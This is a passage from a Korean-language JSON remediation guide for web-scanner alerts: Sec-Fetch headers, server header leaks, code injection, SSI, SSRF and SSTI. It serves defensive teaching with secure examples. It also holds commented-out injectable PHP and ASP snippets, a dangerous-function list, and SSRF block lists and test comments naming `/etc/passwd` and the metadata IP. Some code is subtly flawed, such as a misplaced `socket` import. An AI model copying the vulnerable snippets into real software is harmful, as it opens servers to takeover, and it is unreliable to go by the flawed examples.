      "**CSRF 방어에 활용:** `Sec-Fetch-Site` 헤더는 CSRF (Cross-Site Request Forgery) 공격을 방어하는 데 매우 유용합니다. 특히 상태 변경을 유발하는 요청에 대해 `same-origin` 또는 `same-site`만 허용하도록 하는 로직을 적용할 수 있습니다."
    ],
    "example_code_nodejs_express": "// Node.js Express 예시: Sec-Fetch-Site 유효성 검사 미들웨어 및 CSRF 방어 활용\napp.use((req, res, next) => {\n  const secFetchSite = req.headers['sec-fetch-site'];\n  const validSiteValues = ['same-origin', 'same-site', 'cross-site', 'none'];\n\n  if (secFetchSite && !validSiteValues.includes(secFetchSite)) {\n    console.warn(`Invalid Sec-Fetch-Site header value detected: ${secFetchSite} for URL: ${req.url}`);\n    // return res.status(400).send('Bad Request: Invalid Fetch-Site header.');\n  }\n\n  // 특히 POST, PUT, DELETE 요청에 대한 CSRF 방어\n  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {\n    if (secFetchSite && secFetchSite !== 'same-origin' && secFetchSite !== 'same-site') {\n      // 'none'은 브라우저에서 직접 입력 시 나타날 수 있으므로 주의 깊게 처리\n      // 'cross-site'는 다른 도메인에서 온 요청을 의미\n      console.warn(`Cross-site request detected for sensitive action: ${req.url} from ${secFetchSite}`);\n      // return res.status(403).send('Forbidden: Cross-site request not allowed.');\n    }\n  }\n  next();\n});\n    "
  },
  "Sec-Fetch-Site Header is Missing": {
    "translated": "Sec-Fetch-Site 헤더 누락 – Fetch Metadata 헤더의 'Sec-Fetch-Site'가 누락됨",
    "description": "`Sec-Fetch-Site` HTTP 요청 헤더가 누락되어 있음을 나타냅니다. 이 헤더는 브라우저가 요청의 출처를 나타내기 위해 자동으로 추가합니다.",
    "solution_guidelines": [
      "**브라우저 동작 이해:** `Sec-Fetch-Site` 헤더는 브라우저가 직접 시작하는 모든 요청에 대해 존재하는 것이 일반적입니다. 누락된 경우 cURL과 같은 도구를 사용한 직접적인 요청 또는 구형 브라우저로부터의 요청일 수 있습니다.",
      "**CSRF 방어 강화:** `Sec-Fetch-Site` 헤더는 CSRF 공격을 방어하는 데 중요한 역할을 합니다. 특히 상태를 변경하는 모든 요청(POST, PUT, DELETE)에 대해 이 헤더의 존재 여부 및 값을 검사하는 것이 좋습니다.",
      "**예상치 못한 누락 시 요청 거부:** 민감한 작업에 대한 요청에서 `Sec-Fetch-Site` 헤더가 예상되는데 누락되었다면, 이를 잠재적인 CSRF 시도로 간주하고 요청을 거부하는 로직을 구현합니다."
    ],
    "example_code_nodejs_express": "// Node.js Express 예시: 민감한 API에 대한 Sec-Fetch-Site 헤더 누락 및 값 검사\napp.post('/api/transfer_funds', (req, res, next) => {\n  const secFetchSite = req.headers['sec-fetch-site'];\n\n  // 'transfer_funds'와 같은 민감한 작업은 'same-origin' 또는 'same-site'에서만 허용되어야 합니다.\n  // 헤더가 없거나 'cross-site'라면 의심스러운 요청으로 간주합니다.\n  if (!secFetchSite || (secFetchSite !== 'same-origin' && secFetchSite !== 'same-site')) {\n    console.warn(`Suspicious request for transfer_funds: Sec-Fetch-Site missing or invalid (${secFetchSite || 'MISSING'})`);\n    return res.status(403).send('Forbidden: Invalid request origin.');\n  }\n  next();\n});\n    "
  },
  "Sec-Fetch-User Header Has an Invalid Value": {
    "translated": "Sec-Fetch-User 헤더 값 부적절 – Fetch Metadata 헤더의 'Sec-Fetch-User' 값이 유효하지 않음",
    "description": "`Sec-Fetch-User` HTTP 요청 헤더에 유효하지 않은 값이 포함되어 있음을 나타냅니다. 이 헤더는 사용자 활성화(user activation)가 있었는지 여부를 나타내며, 유효하지 않은 값은 잠재적인 변조 시도 또는 오작동을 의미할 수 있습니다.",
    "solution_guidelines": [
      "**유효한 값만 허용:** `Sec-Fetch-User` 헤더는 값이 존재할 경우 `?1`이어야 합니다. 다른 유효하지 않은 값이 포함되어 있다면 이를 비정상적인 요청으로 간주하고 로깅하거나 경고합니다.",
      "**정상적인 동작 이해:** 이 헤더는 사용자가 탐색을 시작했을 때(예: 링크 클릭, 폼 제출) `?1`로 설정되며, 스크립트에 의한 백그라운드 요청에서는 존재하지 않거나 값이 설정되지 않습니다.",
      "**Clickjacking 방어 보조:** Clickjacking과 같은 공격을 방어하는 데 보조적인 역할을 할 수 있습니다. 사용자의 직접적인 상호작용이 필요한 기능에서 이 헤더의 존재 및 유효성 검사를 통해 자동화된 클릭이나 악의적인 스크립트에 의한 요청을 필터링하는 데 도움을 줄 수 있습니다."
    ],
    "example_code_nodejs_express": "// Node.js Express 예시: Sec-Fetch-User 유효성 검사 미들웨어\napp.use((req, res, next) => {\n  const secFetchUser = req.headers['sec-fetch-user'];\n\n  // Sec-Fetch-User는 '?' 또는 '?1'만 허용됩니다. (실제로는 '?'는 나타나지 않음)\n  // 일반적으로는 '?' 또는 '?1' (사용자 활성화), 또는 헤더 자체가 없는 경우입니다.\n  if (secFetchUser && secFetchUser !== '?1') {\n    console.warn(`Invalid Sec-Fetch-User header value detected: ${secFetchUser} for URL: ${req.url}`);\n    // return res.status(400).send('Bad Request: Invalid Fetch-User header.');\n  }\n  next();\n});\n    "
  },
  "Sec-Fetch-User Header is Missing": {
    "translated": "Sec-Fetch-User 헤더 누락 – Fetch Metadata 헤더의 'Sec-Fetch-User'가 누락됨",
    "description": "`Sec-Fetch-User` HTTP 요청 헤더가 누락되어 있음을 나타냅니다. 이 헤더는 사용자 활성화 여부를 나타내며, 누락은 백그라운드 요청이거나, 특정 공격 도구 또는 구형 브라우저로부터의 요청일 수 있습니다.",
    "solution_guidelines": [
      "**기본 동작 이해:** `Sec-Fetch-User` 헤더는 사용자 상호작용(예: 링크 클릭, 폼 제출)에 의해 발생하는 탐색 요청에 대해서만 `?1`로 설정됩니다. AJAX 요청, 이미지 로드 등 스크립트에 의해 시작되는 요청에서는 이 헤더가 누락되는 것이 정상입니다.",
      "**중요한 사용자 상호작용 검증:** 로그아웃, 비밀번호 변경, 결제 실행 등과 같이 사용자의 명확한 상호작용이 필요한 민감한 기능에 대해 이 헤더의 존재와 값(`?1`)을 확인하여 Clickjacking이나 CSRF 공격을 방어하는 보조적인 수단으로 활용할 수 있습니다.",
      "**과도한 제한 지양:** 모든 요청에 대해 이 헤더의 존재를 강제하면 정상적인 애플리케이션 동작을 방해할 수 있으므로, 신중하게 적용해야 합니다."
    ],
    "example_code_nodejs_express": "// Node.js Express 예시: 사용자 상호작용이 필수적인 로그아웃 기능에 대한 Sec-Fetch-User 헤더 검사\napp.post('/logout', (req, res, next) => {\n  const secFetchUser = req.headers['sec-fetch-user'];\n\n  // 사용자의 직접적인 클릭에 의해 발생한 로그아웃 요청인지 확인\n  if (req.method === 'POST' && secFetchUser !== '?1') {\n    console.warn(`Potential automated logout attempt or clickjacking: Sec-Fetch-User missing or not '?1'`);\n    // return res.status(403).send('Forbidden: User interaction required for logout.');\n  }\n  next();\n});\n    "
  },
  "Secure Pages Include Mixed Content": {
    "translated": "보안 페이지에 혼합 콘텐츠 포함 – HTTPS 페이지에 HTTP 콘텐츠(이미지, 스크립트 등)가 섞여 있어 보안이 저하됨",
    "description": "HTTPS로 제공되는 페이지에 HTTP를 통해 로드되는 리소스(스크립트, 이미지, 스타일시트 등)가 포함되어 있음을 나타냅니다. 이는 중간자 공격(Man-in-the-Middle)을 통해 민감한 정보가 유출되거나 악성 콘텐츠가 주입될 위험이 있습니다.",
    "solution_guidelines": [
      "**모든 리소스를 HTTPS로 제공:** 페이지에 포함된 모든 스크립트, 이미지, 스타일시트, 폰트, iframe 등 모든 리소스가 HTTPS를 통해 로드되도록 경로를 수정합니다. 상대 경로(`//example.com/resource.js`)를 사용하면 프로토콜을 자동으로 따라가므로 유용합니다.",
      "**콘텐츠 보안 정책 (Content Security Policy - CSP) 사용:** `upgrade-insecure-requests` 지시어를 사용하여 HTTP 요청을 HTTPS로 자동 업그레이드하도록 브라우저에 지시하거나, `block-all-mixed-content` 지시어를 사용하여 혼합 콘텐츠를 완전히 차단합니다.",
      "**네트워크 트래픽 모니터링:** 개발자 도구의 네트워크 탭을 사용하여 혼합 콘텐츠가 발생하는지 지속적으로 모니터링하고 수정합니다."
    ],
    "example_code_html_and_csp": "<img src=\"https://example.com/images/logo.png\" alt=\"Logo\">\n<script src=\"https://example.com/js/main.js\"></script>\n<link rel=\"stylesheet\" href=\"https://example.com/css/styles.css\">\n\n<img src=\"//example.com/images/logo.png\" alt=\"Logo\">\n<script src=\"//example.com/js/main.js\"></script>\n<link rel=\"stylesheet\" href=\"//example.com/css/styles.css\">\n\nContent-Security-Policy: upgrade-insecure-requests;\nContent-Security-Policy: default-src 'self' https:;\nContent-Security-Policy: block-all-mixed-content;\n    "
  },
  "Server Leaks Information via \"X-Powered-By\" HTTP Response Header Field(s)": {
    "translated": "서버 정보 유출 - \"X-Powered-By\" HTTP 응답 헤더 – X-Powered-By 헤더를 통해 서버의 기술 스택 정보가 노출됨",
    "description": "`X-Powered-By` HTTP 응답 헤더가 웹 서버가 사용하는 기술(예: ASP.NET, PHP, Express) 정보를 노출하고 있습니다. 이 정보는 공격자가 특정 기술 스택의 알려진 취약점을 찾고 공격을 시작하는 데 사용될 수 있습니다.",
    "solution_guidelines": [
      "**`X-Powered-By` 헤더 제거:** 웹 서버 또는 프레임워크 설정을 통해 `X-Powered-By` 헤더를 완전히 제거합니다. 대부분의 웹 서버와 프레임워크는 이 헤더를 비활성화하거나 제거하는 옵션을 제공합니다.",
      "**운영 체제/서비스 수준에서 헤더 제거:** 프록시 서버(예: Nginx, Apache), 로드 밸런서 또는 WAF(Web Application Firewall)를 사용하여 `X-Powered-By`와 같은 불필요한 헤더를 필터링하거나 제거합니다.",
      "**정보 노출 최소화:** 웹 서버가 제공하는 모든 오류 메시지, 배너 등에 포함될 수 있는 버전 정보나 기술 스택 정보를 제거하거나 일반적인 메시지로 대체합니다."
    ],
    "example_code_nginx": "# Nginx 설정 예시 (http, server 또는 location 블록 내)\nproxy_hide_header X-Powered-By;\n    ",
    "example_code_apache": "# Apache httpd.conf 또는 .htaccess 예시\n<IfModule mod_headers.c>\n    Header unset X-Powered-By\n</IfModule>\n    ",
    "example_code_nodejs_express": "// Express.js (Node.js) 예시\nconst express = require('express');\nconst app = express();\n\n// X-Powered-By 헤더 제거\napp.disable('x-powered-by');\n\n// 또는 수동으로 제거\n// app.use((req, res, next) => {\n// \t res.removeHeader('X-Powered-By');\n// \t next();\n// });\n    ",
    "example_code_php": "<?php\n// PHP 예시 (php.ini에서 설정하는 것이 권장됨)\n// php.ini: expose_php = Off\n\n// 또는 스크립트에서 (권장되지 않음, 서버 설정이 우선)\nheader_remove('X-Powered-By');\n?>\n    "
  },
  "Server Leaks Version Information via \"Server\" HTTP Response Header Field": {
    "translated": "서버 정보 유출 - \"Server\" HTTP 응답 헤더를 통한 버전 정보 – Server 헤더에 웹 서버의 버전 정보가 노출됨",
    "description": "`Server` HTTP 응답 헤더가 웹 서버의 종류와 버전 정보를 노출하고 있습니다 (예: Apache/2.4.X, Nginx/1.X.X). 이 정보는 공격자가 특정 웹 서버 소프트웨어의 알려진 취약점을 찾아 공격을 시도하는 데 사용될 수 있습니다.",
    "solution_guidelines": [
      "**`Server` 헤더 정보 최소화/숨기기:** 웹 서버 설정을 통해 `Server` 헤더가 노출하는 정보를 최소화하거나 완전히 숨깁니다. 예를 들어, `Server` 헤더를 `Apache` 또는 `Nginx`로만 표시하고 버전 정보를 제거하거나, 완전히 제거합니다.",
      "**프록시/로드 밸런서 사용:** 웹 서버 앞에 리버스 프록시(예: Nginx, Apache)나 로드 밸런서(예: Cloudflare, AWS ALB)를 배치하여, 클라이언트에는 프록시/로드 밸런서의 `Server` 헤더만 노출되도록 합니다.",
      "**오류 페이지 정보 제거:** 웹 서버가 생성하는 기본 오류 페이지(404, 500 등)에도 버전 정보가 노출되지 않도록 사용자 정의 오류 페이지를 사용합니다."
    ],
    "example_code_nginx": "# Nginx 설정 예시 (http 블록 내)\nserver_tokens off; # 버전 정보 숨김\n\n# 완전히 제거하려면 WAF/프록시에서 처리해야 함\n    ",
    "example_code_apache": "# Apache httpd.conf 또는 가상 호스트 설정 예시\nServerTokens Prod # Server 헤더를 'Apache'로만 표시\nServerSignature Off # 오류 페이지에서 서버 버전 정보 숨김\n    ",
    "example_code_iis": "<system.webServer>\n  <outboundRules>\n    <rule name=\"Remove Server header\">\n      <match serverVariable=\"RESPONSE_Server\" pattern=\".*\" />\n      <action type=\"Rewrite\" value=\"\" />\n    </rule>\n  </outboundRules>\n</system.webServer>\n    "
  },
  "Server Leaks its Webserver Application via \"Server\" HTTP Response Header Field": {
    "translated": "서버 정보 유출 - \"Server\" HTTP 응답 헤더를 통한 웹 서버 애플리케이션 – Server 헤더에 웹 서버 애플리케이션의 종류(Apache, Nginx 등)가 노출됨",
    "description": "`Server` HTTP 응답 헤더 필드를 통해 웹 서버 소프트웨어(예: Apache, Nginx, IIS) 이름이 노출되고 있습니다. 이는 특정 웹 서버 소프트웨어에 대한 표적 공격을 용이하게 할 수 있습니다.",
    "solution_guidelines": [
      "**`Server` 헤더 정보 최소화/숨기기:** `Server` 헤더에서 웹 서버의 종류를 숨기거나 일반적인 값으로 변경합니다. 버전 정보와 동일하게, 이 정보를 최소화하는 것이 좋습니다.",
      "**보안 헤더 관리 도구 사용:** 웹 애플리케이션 방화벽(WAF)이나 API 게이트웨이와 같은 보안 솔루션을 사용하여 불필요한 헤더를 제거하거나 변경할 수 있습니다.",
      "**지속적인 업데이트:** 사용 중인 웹 서버 소프트웨어를 항상 최신 버전으로 유지하여 알려진 취약점을 해결합니다."
    ],
    "example_code_general_concept": "(Solution is similar to \"Server Leaks Version Information via \"Server\" HTTP Response Header Field\", focusing on removing or generalizing the server name itself. This typically involves server configuration or a proxy/WAF.)\n    "
  },
  "Server Side Code Injection": {
    "translated": "서버 측 코드 주입 – 웹 서버에서 실행되는 코드에 사용자 입력이 주입되어 임의의 코드를 실행할 수 있음",
    "description": "공격자가 서버 측에서 임의의 코드를 실행할 수 있는 취약점입니다. 이는 입력값 검증 미흡으로 인해 사용자 입력이 서버에서 코드로 해석되거나 실행될 때 발생합니다. 공격자는 이를 통해 시스템 명령 실행, 정보 유출, 파일 조작 등 심각한 피해를 유발할 수 있습니다.",
    "solution_guidelines": [
      "**모든 사용자 입력에 대한 강력한 유효성 검사:** 사용자로부터 받은 모든 입력은 서버 측에서 엄격하게 검증되어야 합니다. 예상되는 데이터 형식, 길이, 문자 집합 등을 벗어나는 입력은 거부합니다.",
      "**입력값 이스케이프 처리:** 사용자 입력이 코드나 명령으로 해석되지 않도록 적절하게 이스케이프 처리하거나 인코딩합니다. 예를 들어, 쉘 명령어를 실행할 때 특수 문자를 이스케이프 처리합니다.",
      "**안전한 API 및 함수 사용:** 사용자 입력을 처리하는 데 사용되는 함수나 API가 코드 주입에 취약하지 않은지 확인하고, 안전한 대안(예: `exec` 대신 `escapeshellarg`와 함께 `exec`)을 사용합니다.",
      "**Least Privilege (최소 권한 원칙):** 애플리케이션이 실행되는 계정은 필요한 최소한의 권한만 가져야 합니다. 외부 명령을 실행하는 경우, 해당 명령이 실행될 수 있는 권한을 최소화합니다.",
      "**샌드박싱/컨테이너화:** 코드를 실행해야 하는 경우, 샌드박스 환경이나 컨테이너(Docker 등) 내에서 실행하여 잠재적인 공격의 영향을 제한합니다.",
      "**코드 검토 및 정적/동적 분석:** 정기적인 코드 검토와 SAST/DAST 도구를 사용하여 코드 주입 취약점을 탐지하고 제거합니다."
    ],
    "example_code_php_command_injection_secure": "<?php\n// PHP Command Injection Secure Example\nif (isset($_GET['filename'])) {\n    $filename = $_GET['filename'];\n\n    // 1. 입력값 유효성 검사: 파일 이름에 안전한 문자만 허용 (알파벳, 숫자, 하이픈, 언더스코어, 점)\n    //    이 예시는 매우 엄격하며, 실제 파일 시스템 경로에 따라 더 복잡해질 수 있습니다.\n    if (!preg_match('/^[a-zA-Z0-9_.-]+$/', $filename)) {\n        die(\"Invalid filename provided.\");\n    }\n\n    // 2. escapeshellarg() 사용하여 인자 이스케이프 (가장 중요)\n    $escaped_filename = escapeshellarg($filename);\n\n    // 3. 외부 명령 실행 (절대 사용자 입력과 직접 연결하지 마세요!)\n    //    'ls -l' 대신 'cat' 등 실제 사용 목적에 맞는 명령어를 사용하고\n    //    가능한 한 외부 명령 실행을 피하는 것이 좋습니다.\n    $command = \"ls -l \" . $escaped_filename;\n\n    echo \"<pre>\";\n    system($command);\n    echo \"</pre>\";\n} else {\n    echo \"Please provide a 'filename' parameter.\";\n}\n?>\n    ",
    "example_code_python_os_command_injection_secure": "import subprocess\nimport shlex\n\n# Python OS Command Injection Secure Example\ndef read_file_secure(filename):\n    # 1. 입력값 유효성 검사 (필요한 경우 추가)\n    # 예를 들어, 파일 이름에 '../'와 같은 경로 조작 문자가 없는지 확인\n    if '..' in filename or '/' in filename or '\\\\' in filename:\n        return \"Invalid filename.\"\n\n    try:\n        # 2. subprocess.run() 사용 시 shell=False (가장 중요)\n        #    사용자 입력을 직접 명령의 인자로 전달 (shlex.split은 필요에 따라 사용)\n        #    이 방법은 명령 자체에 대한 주입은 방지하지만, 인자 주입은 여전히 주의해야 합니다.\n        #    가장 안전한 방법은 명령과 인자를 리스트로 직접 제공하는 것입니다.\n        result = subprocess.run(['cat', filename], capture_output=True, text=True, check=True)\n        return result.stdout\n    except subprocess.CalledProcessError as e:\n        return f\"Error executing command: {e}\"\n    except FileNotFoundError:\n        return f\"File not found: {filename}\"\n\n# 사용 예시\n# print(read_file_secure(\"safe_file.txt\"))\n# print(read_file_secure(\"../../etc/passwd\")) # 방어됨\n    "
  },
  "Server Side Code Injection - ASP Code Injection": {
    "translated": "서버 측 코드 주입 - ASP 코드 주입 – ASP 코드에 악성 코드를 삽입하여 실행할 수 있음",
    "description": "ASP (Active Server Pages) 애플리케이션에서 사용자 입력이 서버 측 ASP 코드로 해석되어 실행될 수 있는 취약점입니다. 이는 `eval` 함수나 문자열 연결을 통한 동적 코드 생성 시 주로 발생합니다.",
    "solution_guidelines": [
      "**`eval` 함수 사용 자제 및 엄격한 입력 검증:** ASP의 `eval` 함수는 사용자 입력과 함께 사용될 때 매우 위험합니다. 필수적으로 사용해야 하는 경우, `eval`에 전달되는 모든 입력에 대해 매우 엄격한 화이트리스트 기반의 유효성 검사를 수행합니다.",
      "**데이터와 코드 분리:** 사용자 입력 데이터를 절대로 실행 가능한 코드로 직접 사용하지 않습니다. 데이터는 데이터로, 코드는 코드로 명확히 분리합니다.",
      "**템플릿 엔진 사용:** 동적인 콘텐츠 생성이 필요하면 안전한 템플릿 엔진(예: Razor for ASP.NET)을 사용하여 자동 이스케이프 기능을 활용합니다.",
      "**최소 권한 원칙:** ASP 애플리케이션이 실행되는 계정에 최소한의 권한을 부여합니다."
    ],
    "example_code_asp_classic_secure": "<% ' ASP Classic Secure Example\n\n' 사용자 입력\nDim userInput\nuserInput = Request.QueryString(\"name\")\n\n' 안전한 방법: 입력값 검증 및 이스케이프 처리\n' 이 예시는 단순히 HTML 인코딩을 보여주지만,\n' 실제 코드 주입 방지를 위해서는 더 강력한 검증이 필요합니다.\n' eval()과 같은 함수는 아예 사용하지 않아야 합니다.\n\nIf Len(userInput) > 0 Then\n    ' HTML 인코딩 (XSS 방지에 더 가깝지만, 기본적인 이스케이프의 개념)\n    Response.Write \"Hello, \" & Server.HTMLEncode(userInput) & \"<br>\"\nElse\n    Response.Write \"Please provide a name.<br>\"\nEnd If\n\n' ' 취약한 예시 (절대 사용 금지)\n' Dim codeToExecute\n' codeToExecute = \"Response.Write(\"\"Hello, \" & Request.QueryString(\"name\") & \"\"\")\"\n' Execute codeToExecute\n%>\n    "
  },
  "Server Side Code Injection - PHP Code Injection": {
    "translated": "서버 측 코드 주입 - PHP 코드 주입 – PHP 코드에 악성 코드를 삽입하여 실행할 수 있음",
    "description": "PHP 애플리케이션에서 사용자 입력이 서버 측 PHP 코드로 해석되어 실행될 수 있는 취약점입니다. 이는 `eval()`, `include`/`require`, `unserialize()` 등과 같은 함수를 사용자 입력과 함께 사용할 때 주로 발생합니다.",
    "solution_guidelines": [
      "**`eval()` 함수 사용 절대 금지:** `eval()` 함수는 매우 위험하므로 사용자 입력과 함께 절대로 사용해서는 안 됩니다. 동적으로 코드를 실행해야 하는 경우, 안전한 대안을 찾거나 엄격한 샌드박스 환경에서 실행합니다.",
      "**`include`/`require` 경로 제한:** `include` 또는 `require` 문에 사용자 입력이 포함된 경로를 사용하는 경우, 허용된 파일만 포함되도록 화이트리스트 기반의 유효성 검사와 디렉토리 제한을 적용합니다.",
      "**`unserialize()` 사용 시 주의:** 신뢰할 수 없는 소스로부터 받은 데이터를 `unserialize()`하지 않습니다. 이는 객체 주입(Object Injection)으로 이어질 수 있습니다.",
      "**필터링 및 이스케이프:** 사용자 입력에 대해 철저한 필터링 및 이스케이프 처리를 수행하여 PHP 코드의 구문이나 함수로 해석될 수 있는 문자열을 제거합니다.",
      "**`disable_functions` 사용:** `php.ini`에서 `disable_functions` 설정을 사용하여 `system`, `exec`, `shell_exec`, `passthru`, `eval` 등 위험한 함수들을 비활성화합니다.",
      "**Least Privilege:** PHP 프로세스가 실행되는 사용자 계정의 권한을 최소화합니다."
    ],
    "example_code_php_secure": "<?php\n// PHP Code Injection Secure Example\nif (isset($_GET['action'])) {\n    $action = $_GET['action'];\n\n    // 1. 입력값 유효성 검사 (화이트리스트 방식)\n    $allowedActions = ['viewProfile', 'editProfile', 'deleteProfile'];\n\n    if (!in_array($action, $allowedActions)) {\n        die(\"Invalid action specified.\");\n    }\n\n    // 2. 직접 코드 실행 대신 조건문 또는 맵핑 사용\n    switch ($action) {\n        case 'viewProfile':\n            echo \"Viewing user profile.\";\n            // Call a safe function or include a safe file\n            break;\n        case 'editProfile':\n            echo \"Editing user profile.\";\n            break;\n        case 'deleteProfile':\n            echo \"Deleting user profile.\";\n            break;\n        default:\n            // Should not be reached due to in_array check\n            echo \"Unknown action.\";\n            break;\n    }\n} else {\n    echo \"Please specify an action.\";\n}\n\n// // 취약한 예시 (절대 사용 금지)\n// if (isset($_GET['cmd'])) {\n// \t eval($_GET['cmd']);\n// }\n//\n// if (isset($_GET['page'])) {\n// \t include $_GET['page'] . '.php'; // 디렉토리 트래버설 및 코드 주입 가능\n// }\n?>\n    "
  },
  "Server Side Include": {
    "translated": "서버 측 포함 – 서버 측 포함(SSI) 지시자를 통해 파일 내용을 읽거나 명령을 실행하는 공격",
    "description": "서버 측 포함(SSI) 취약점은 웹 서버가 사용자 입력으로 인해 SSI 지시문을 실행하여, 로컬 파일 읽기, 임의 명령어 실행, 정보 유출 등을 초래할 수 있는 경우에 발생합니다.",
    "solution_guidelines": [
      "**SSI 비활성화:** 웹 서버 설정에서 SSI를 사용하지 않는다면 완전히 비활성화합니다.",
      "**사용자 입력에 대한 강력한 필터링:** SSI를 사용하는 경우, 사용자 입력이 SSI 지시문으로 해석될 수 있는 문자(예: ``)를 포함하지 않도록 강력한 화이트리스트 기반의 유효성 검사를 수행합니다.",
      "**HTML 인코딩:** 사용자 입력을 HTML 페이지에 출력하기 전에 항상 HTML 엔티티로 인코딩하여 SSI 지시문이 아닌 일반 텍스트로 표시되도록 합니다.",
      "**최소 권한 원칙:** SSI 프로세스가 실행되는 계정의 권한을 최소화하고, `exec` 명령과 같은 위험한 지시어의 사용을 제한합니다."
    ],
    "example_code_apache_config_ssi_protection": "\n# Apache httpd.conf 또는 .htaccess 예시 (SSI가 필요한 경우)\n\n# SSI를 특정 디렉토리에서만 허용\n<Directory \"/var/www/html/ssi_enabled_pages\">\n    Options +Includes\n    AddType text/html .shtml\n    AddOutputFilter INCLUDES .shtml\n</Directory>\n\n# 사용자 입력 처리 시 (서버 사이드 스크립트에서)\n# PHP에서 SSI를 통해 내용을 동적으로 생성할 때 사용자 입력을 포함한다면:\n<?php\n// 사용자 입력\n$comment = $_POST['comment'];\n\n// SSI 주석 문자열을 이스케이프\n$escapedComment = str_replace('-->', '&amp;#45;&amp;#45;&amp;gt;', $comment); // -->를 HTML 인코딩\n\n// 또는 더 강력한 HTML 엔티티 인코딩\n$escapedComment = htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');\n\n// 이스케이프된 내용을 출력하거나 파일에 저장\necho $escapedComment;\n?>\n    "
  },
  "Server Side Request Forgery": {
    "translated": "서버 측 요청 위조 (SSRF) – 서버가 내부 네트워크나 외부 시스템에 임의의 요청을 보내도록 조작하여 내부 시스템 접근, 정보 유출, 포트 스캐닝 등을 수행함",
    "description": "SSRF (Server Side Request Forgery)는 공격자가 서버를 조작하여 내부 네트워크의 리소스(예: 내부 서비스, 데이터베이스, 파일 시스템) 또는 외부 서비스로 임의의 요청을 보내도록 하는 취약점입니다.",
    "solution_guidelines": [
      "**요청 목적지 화이트리스트:** 서버가 외부 리소스에 접근해야 하는 경우, 허용된 도메인 또는 IP 주소(CIDR 블록 포함)의 화이트리스트를 엄격하게 관리합니다. 블랙리스트는 우회될 수 있으므로 권장하지 않습니다.",
      "**입력값 유효성 검사:** 사용자로부터 URL 또는 도메인, IP 주소를 입력받는 경우, 입력값에 대해 엄격한 유효성 검사를 수행하여 스키마(http/https만 허용), 포트, 호스트, 경로 등을 제어합니다.",
      "**리다이렉션 방지:** 서버 측에서 HTTP 리다이렉션이 발생하는 경우, 리다이렉션된 URL이 내부 네트워크 또는 블랙리스트에 포함된 외부 IP를 가리키는지 확인하고 차단합니다.",
      "**내부 IP 주소 차단:** 사용자 입력이 포함된 URL에서 내부 IP 주소(예: `127.0.0.1`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `localhost`, AWS EC2 메타데이터 서비스 IP `169.254.169.254`)로의 접근을 명시적으로 차단합니다.",
      "**응답 데이터 제한:** 외부 리소스에서 받아오는 응답 데이터의 크기나 타입을 제한하여 정보 유출이나 서비스 거부 공격을 방지합니다.",
      "**Least Privilege:** 서버가 외부 요청을 수행하는 경우, 해당 네트워크 접근에 대한 권한을 최소화합니다."
    ],
    "example_code_python_ssrf_protection": "import requests\nfrom urllib.parse import urlparse\nimport ipaddress\n\n# 허용되지 않는 내부 IP 범위 (RFC 1918 + loopback + AWS EC2 metadata)\nPRIVATE_NETWORKS = [\n    ipaddress.ip_network('127.0.0.0/8'),\n    ipaddress.ip_network('10.0.0.0/8'),\n    ipaddress.ip_network('172.16.0.0/12'),\n    ipaddress.ip_network('192.168.0.0/16'),\n    ipaddress.ip_network('169.254.169.254/32') # AWS EC2 Metadata Service\n]\n\ndef is_private_ip(ip_address):\n    try:\n        ip = ipaddress.ip_address(ip_address)\n        for net in PRIVATE_NETWORKS:\n            if ip in net:\n                return True\n        return False\n    except ValueError:\n        return False # 유효한 IP 주소가 아님\n\ndef fetch_url_securely(url):\n    parsed_url = urlparse(url)\n\n    # 1. 스키마 화이트리스트\n    if parsed_url.scheme not in ['http', 'https']:\n        return \"Error: Only HTTP/HTTPS schemes are allowed.\"\n\n    # 2. 호스트 검증 (예: 특정 도메인만 허용)\n    # 실제 환경에서는 허용된 도메인 리스트를 관리해야 합니다.\n    allowed_domains = ['example.com', 'api.trusted-service.com']\n    if parsed_url.hostname:\n        if parsed_url.hostname not in allowed_domains:\n            # IP 주소인 경우에도 내부 IP 차단 로직이 중요\n            if not is_private_ip(parsed_url.hostname):\n                # 외부 IP인 경우 DNS 쿼리 결과 검증 (잠재적 SSRF 우회 방지)\n                try:\n                    import socket\n                    resolved_ip = socket.gethostbyname(parsed_url.hostname)\n                    if is_private_ip(resolved_ip):\n                        return \"Error: Resolved IP is a private address.\"\n                except socket.gaierror:\n                    return \"Error: Could not resolve hostname.\"\n            else:\n                return \"Error: Access to private IP addresses is forbidden.\"\n            \n            # 허용된 도메인에 없으면 차단\n            return \"Error: Access to this domain is not allowed.\"\n\n\n    try:\n        # 3. 요청 타임아웃 설정 (서비스 거부 공격 방지)\n        # 4. 리다이렉션 추적 및 검증 (requests 라이브러리는 기본적으로 리다이렉션 추적)\n        #    리다이렉트된 최종 URL이 내부 IP를 가리키는지 확인하는 로직 필요\n        response = requests.get(url, timeout=5, allow_redirects=True)\n        # requests의 history를 사용하여 리다이렉트된 모든 URL 검사\n        for resp_history in response.history:\n            parsed_redirect_url = urlparse(resp_history.url)\n            if parsed_redirect_url.hostname and is_private_ip(socket.gethostbyname(parsed_redirect_url.hostname)):\n                return \"Error: Redirected to a private IP address.\"\n\n        response.raise_for_status() # HTTP 오류 발생 시 예외 던짐\n        return response.text\n    except requests.exceptions.RequestException as e:\n        return f\"Error fetching URL: {e}\"\n\n# 사용 예시\n# print(fetch_url_securely(\"http://example.com/api/data\"))\n# print(fetch_url_securely(\"http://127.0.0.1/admin\")) # 차단됨\n# print(fetch_url_securely(\"http://localhost/admin\")) # 차단됨\n# print(fetch_url_securely(\"http://169.254.169.254/latest/meta-data/\")) # 차단됨\n    "
  },
  "Server Side Template Injection": {
    "translated": "서버 측 템플릿 주입 – 웹 애플리케이션의 템플릿 엔진에 악성 코드를 주입하여 서버 측에서 임의의 코드를 실행함",
    "description": "SSTI (Server Side Template Injection)는 공격자가 웹 템플릿에 악의적인 템플릿 구문을 주입하여 서버 측에서 코드를 실행하거나, 정보 유출, 파일 시스템 접근 등을 유발할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**모든 사용자 입력에 대한 강력한 유효성 검사 및 이스케이프:** 템플릿에 직접 삽입되는 사용자 입력은 템플릿 엔진의 구문으로 해석되지 않도록 반드시 이스케이프 처리해야 합니다. 템플릿 엔진의 자동 이스케이프 기능을 사용하고, 필요한 경우 수동으로도 이스케이프합니다.",
